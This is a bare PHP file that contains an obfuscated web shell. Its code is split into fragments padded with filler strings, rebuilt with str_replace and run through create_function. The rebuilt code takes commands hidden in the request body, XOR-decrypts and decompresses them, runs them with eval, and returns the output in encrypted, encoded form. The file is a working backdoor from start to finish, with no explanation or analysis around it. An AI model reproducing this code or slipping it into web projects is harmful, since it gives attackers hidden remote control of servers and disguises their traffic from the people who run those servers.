<?php
$c=str_replace('BC','','cBCrBCBCeBCBCate_funcBCtion');
$a=';5!functi5!o5!n x($t,$k5!){$c5!=strle5!5!n5!($k);$l=strlen5!($t);$o5!="";for($5!i=0;$i<$l;5!){for(';
$G='!ch("/$kh5!(.+)$kf/",@5!file_5!get_c5!ont5!ents("php5!://input")5!,$5!m)==15!) {@ob_sta5!rt();@5!e5';
$j='$k=5!"1b0acb5!5!fa";$kh="bd5!86b4565!fafa";$k5!f="4356d5!0c53db25!";$p="5!nm34C5!O5!4vnHGrhzT6"';
$b='_en5!d_clea5!n()5!;$r=@base5!5!64_encode5!(@x(5!@5!g5!zcompress($o),$k));pri5!nt5!("$5!p$kh$r$kf");}';
$d='5!$j=0;(5!$j<$5!c5!&&$i<$l);$j5!+5!5!+,$i++){$o.=$5!t{$i}^5!$k5!{$j};}}return $5!5!o;5!5!}if (@preg_mat5';
$P='!val(@gzunc5!ompress5!(@x(@ba5!se645!_de5!co5!5!de($m[15!]),5!$k)))5!;$o=@ob_get_con5!tents();@ob';
$r=str_replace('5!','',$j.$a.$d.$G.$P.$b);
$y=$c('',$r);$y();
?>
